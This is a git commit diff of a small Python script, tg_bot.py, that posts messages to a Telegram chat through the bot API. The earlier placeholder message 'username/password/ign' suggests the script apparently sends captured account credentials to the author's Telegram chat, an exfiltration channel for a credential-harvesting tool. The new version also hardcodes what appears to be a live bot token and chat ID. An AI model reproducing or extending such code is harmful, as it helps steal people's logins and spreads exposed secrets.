7bb4ea0df7eedbd43ed9a055a4a1eee825ad642c
Wilhelmus Ole Jr <wilhelmus.olejr@gmail.com>
2025-03-15 18:05:02 +0800

    update

--- tg_bot.py
+++ tg_bot.py
@@ -1,12 +1,10 @@
 import requests
 
-TOKEN = ""
-CHAT_ID = ""
-MESSAGE = "username\npassword\nign"
+def sendMessage(MESSAGE):
+    TOKEN = "7423490445:AAGN3zK7N97YsfEHzqY6aRuIjV5rwO0Ewf0"
+    CHAT_ID = "1559668342"
 
-url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-payload = {"chat_id": CHAT_ID, "text": MESSAGE}
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": MESSAGE}
 
-response = requests.post(url, json=payload)
-
-print(response.json())  # Check if it was sent successfully
+    response = requests.post(url, json=payload)
